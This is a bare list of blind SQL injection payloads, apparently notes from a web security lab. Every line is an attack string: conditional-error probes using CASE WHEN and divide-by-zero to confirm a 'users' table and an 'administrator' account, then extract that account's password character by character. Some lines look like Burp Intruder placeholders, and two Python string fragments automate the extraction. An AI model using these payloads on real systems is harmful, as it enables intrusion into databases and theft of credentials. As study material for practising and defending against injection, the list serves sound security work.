SELECT CASE WHEN (YOUR-CONDITION-HERE) THEN TO_CHAR(1/0) ELSE NULL END FROM dual
' AND (SELECT CASE WHEN (1=2) THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a
' AND (SELECT CASE WHEN (1=1) THEN 1/0 ELSE 'a' END)='a
' AND (SELECT CASE WHEN (Username = 'Administrator' AND SUBSTRING(Password, 1, 1) > 'm') THEN TO_CHAR(1/0) ELSE 'a' END FROM Users)='a
' AND (SELECT CASE WHEN (username = 'administrator' AND SUBSTR(password, 1, 1) = '§m§') THEN TO_CHAR(1/0) ELSE 'a' END FROM users)='a
(SELECT 'a' FROM users LIMIT 1)='a
' AND (SELECT CASE WHEN ((SELECT 'a' FROM users LIMIT 1)='a') THEN TO_CHAR(1/0) ELSE 'a' END FROM users)='a
' AND (SELECT CASE WHEN ((SELECT 'a' FROM users LIMIT 1)!='a') THEN TO_CHAR(1/0) ELSE 'a' END FROM dual)='a

(SELECT 'a' FROM users WHERE ROWNUM = 1) ='a'

(SELECT 'a' FROM users WHERE username='administrator')='a'

(SELECT 'a' FROM users WHERE username='administrator' AND LENGTH(password)>1)='a'

(SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a'

"' AND (SELECT CASE WHEN ((SELECT ascii(SUBSTRING(password,%s,1)) FROM users WHERE username='administrator')='%s') THEN 'a' ELSE TO_CHAR(1/0)  END FROM dual)='a" % (
i, j)

sqli_payload = "' AND (SELECT ascii(SUBSTRING(password,%s,1)) FROM users WHERE username='administrator')='%s'--" % (
i, j)

' AND (SELECT CASE WHEN (SELECT username = 'administrator' AND SUBSTR(password, 1, 1) = '§m§') THEN TO_CHAR(1/0) ELSE 'a' END FROM users)='a
